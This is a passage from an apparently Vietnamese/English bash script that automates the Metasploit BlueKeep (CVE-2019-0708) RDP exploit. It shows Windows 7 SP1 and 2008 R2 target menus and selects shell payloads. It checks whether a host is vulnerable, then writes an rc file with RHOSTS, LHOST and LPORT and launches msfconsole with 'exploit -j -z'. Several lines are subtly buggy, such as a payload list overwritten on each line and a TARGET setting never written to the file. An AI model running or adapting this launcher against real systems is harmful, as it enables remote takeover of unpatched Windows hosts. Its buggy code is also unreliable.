   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)

!
	elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting
   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)

!
	fi
else
	if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   None

!
	elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   None

!
	fi
fi
}

function target {
if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
	if [ "$language" = "VN" ]; then
		if [ "$target" = "0" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Tự động điều chỉnh mục tiêu thông qua lấy dấu tay

!
		elif [ "$target" = "1" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)

!
		elif [ "$target" = "2" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)

!
		elif [ "$target" = "3" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)

!
		elif [ "$target" = "4" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)

!
		elif [ "$target" = "5" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)

!
		elif [ "$target" = "6" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)

!
		elif [ "$target" = "7" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)

!
		fi
	elif [ "$language" = "EN" ]; then
		if [ "$target" = "0" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting

!
		elif [ "$target" = "1" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)

!
		elif [ "$target" = "2" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)

!
		elif [ "$target" = "3" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)

!
		elif [ "$target" = "4" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)

!
		elif [ "$target" = "5" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)

!
		elif [ "$target" = "6" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)

!
		elif [ "$target" = "7" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)

!
		fi
	fi
else
	if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   None

!
	elif [ "$language" = "EN" ]; then
cat << !
Exploit targets:
   Id  Name
   --  ----
   0   None

!
	fi
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   generic/custom" > $payload_list_file
cat $payload_data | grep -i "   generic/shell" > $payload_list_file
cat $payload_data | grep -i "   windows/x64/" > $payload_list_file

echo "" >> $payload_list_file
}
function out_value {
rhost=`echo $rhost`
rport=`echo $rport`
paylo=`echo $paylo`
lhost=`echo $lhost`
lport=`echo $lport`
file_ip="ip.txt"
rdp_client_ip=`echo $rdp_client_ip`
rdp_client_name=`echo $rdp_client_name`
rdp_domain=`echo $rdp_domain`
rdp_user=`echo $rdp_user`
target=`echo $target`
}
function check {
rhost=`echo $rhost`
rport=`echo $rport`
path_present=`pwd`
path_tool="../../Tools/Vulnerability-Exploit/CVE-2019-0708/"
file_ip="ip.txt"
timeout="3"
cd $path_tool
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
bash checkvuln.sh -p $rport -t $timeout
cd $path_present
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
	echo "use exploit/windows/rdp/CVE-2019-0708_rdp_rce" >> $rc_file
fi
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/CVE-2019-0708/"
cd $path_tool
file_ip="ip.txt"
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
check_host=`bash checkvuln.sh -p $rport -t $timeout | grep CVE-2019-0708`
if [[ "$check_host" != "" ]]; then
	if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
		echo "chua phat trien"
	else
		echo "set RDP_CLIENT_IP $rdp_client_ip" >> $rc_file
		echo "set RDP_CLIENT_NAME $rdp_client_name" >> $rc_file
		echo "set RDP_DOMAIN $rdp_domain" >> $rc_file
		echo "set RDP_USER $rdp_user" >> $rc_file
		echo "set RHOSTS $rhost" >> $rc_file
		echo "set RPORT $rport" >> $rc_file
		echo "set LHOST $lhost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
		echo "set TARGET $target"
		echo "exploit -j -z" >> $rc_file
		service postgresql start
		cd ../../../Victim
		echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
		msfconsole -q -r $rc_file
		cd $path_present
	fi
else
	echo -e "${red}[-]$RESET $yout_sure"
cd $path_present
fi
}
